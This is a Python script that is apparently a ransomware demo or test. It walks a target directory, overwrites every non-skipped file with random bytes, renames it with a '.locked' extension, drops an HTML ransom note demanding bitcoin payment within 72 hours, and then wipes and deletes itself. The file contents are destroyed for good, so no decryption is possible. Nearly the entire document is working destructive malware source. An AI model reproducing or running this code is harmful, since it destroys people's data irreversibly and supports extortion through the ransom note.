import os
import random
import shutil
import time

# ─── CONFIG ────────────────────────────────────────────
TARGET_DIR       = r"Ransomwares\Test Folder\Test"
NOTE_FILENAME    = "READ_ME.html"
LOCKED_EXTENSION = ".locked"
SKIP_EXTS        = (".py", ".exe", ".jpg")
BTC_ADDRESS      = "1Q3a6jZ7mX2y9eUcd4yYxKsjEo6sPfX89W"
CONTACT_EMAIL    = "decrypt_request@securemail.cc"

# ─── STEP 1: Overwrite File with Random Data ───────────
def overwrite_with_garbage(path):
    try:
        size = os.path.getsize(path)
        with open(path, "wb") as f:
            f.write(os.urandom(size))
        return True
    except Exception as e:
        print(f"[-] Failed to overwrite: {path} ({e})")
        return False

# ─── STEP 2: Rename File to Simulate Encryption ────────
def _encrypt_file(path):
    if overwrite_with_garbage(path):
        new_path = path + LOCKED_EXTENSION
        os.rename(path, new_path)
        print(f"[+] Destroyed: {path} → {new_path}")
        return new_path
    return None

# ─── STEP 3: Traverse and Destroy Files ────────────────
def destroy_files_in_dir(root_dir):
    affected_dirs = set()
    for curr_dir, _, files in os.walk(root_dir):
        for fname in files:
            if fname.endswith((LOCKED_EXTENSION, NOTE_FILENAME)):
                continue
            if fname.lower().endswith(SKIP_EXTS):
                continue

            full_path = os.path.join(curr_dir, fname)
            result = _encrypt_file(full_path)
            if result:
                affected_dirs.add(curr_dir)
    return affected_dirs

# ─── STEP 4: Drop Ransom Notes ─────────────────────────
def drop_realistic_notes(dirs):
    ransom_note = f"""
<html>
  <head><title>Important: Your Files Have Been Locked</title></head>
  <body style="background-color:#121212;color:#ff4444;font-family:Arial;text-align:center;padding:60px;">
    <h1>🔒 Your Files Have Been Encrypted 🔒</h1>
    <p>Your important files have been encrypted using military-grade algorithms.</p>
    <p>To recover your data:</p>
    <ul style="text-align:left;display:inline-block;margin-top:20px;">
      <li>Send 0.23 BTC to the following address:</li>
      <li><strong>{BTC_ADDRESS}</strong></li>
      <li>Email your transaction ID to: <strong>{CONTACT_EMAIL}</strong></li>
    </ul>
    <p>You have 72 hours. Failure to comply means permanent loss of your data.</p>
    <p><em>This is an automated message. Do not reply.</em></p>
  </body>
</html>
""".strip()

    for d in dirs:
        note_path = os.path.join(d, NOTE_FILENAME)
        with open(note_path, "w", encoding="utf-8") as f:
            f.write(ransom_note)
        print(f"[+] Note dropped in: {note_path}")

# ─── STEP 5: Encrypt & Delete Self ─────────────────────
def encrypt_self_and_delete():
    try:
        self_path = os.path.abspath(__file__)
        print(f"[!] Self-destructing: {self_path}")
        size = os.path.getsize(self_path)
        with open(self_path, "wb") as f:
            f.write(os.urandom(size))
        time.sleep(0.5)
        os.remove(self_path)
    except Exception as e:
        print(f"[-] Self-destruct failed: {e}")

# ─── MAIN ──────────────────────────────────────────────
def main():
    affected_dirs = destroy_files_in_dir(TARGET_DIR)
    drop_realistic_notes(affected_dirs)
    encrypt_self_and_delete()

if __name__ == "__main__":
    main()

